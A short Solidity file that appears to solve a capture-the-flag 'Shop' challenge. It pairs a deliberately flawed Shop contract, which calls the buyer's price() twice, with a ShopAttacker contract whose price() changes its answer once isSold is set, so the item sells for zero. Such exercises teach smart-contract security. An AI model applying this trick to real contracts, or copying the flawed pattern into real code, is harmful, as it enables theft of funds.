// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract ShopAttacker is Buyer{
    bool public reEnter = true;
    uint public priceValue =0;

  function price() external view override returns (uint){
    Shop shop = Shop(msg.sender);
    uint priceAttack = 100;
    if(shop.isSold()){
        priceAttack = 0;
    }
     return priceAttack;
  }

     function attack(address shop) public payable {
        Shop myshop = Shop(shop);
        myshop.buy();
  }
}
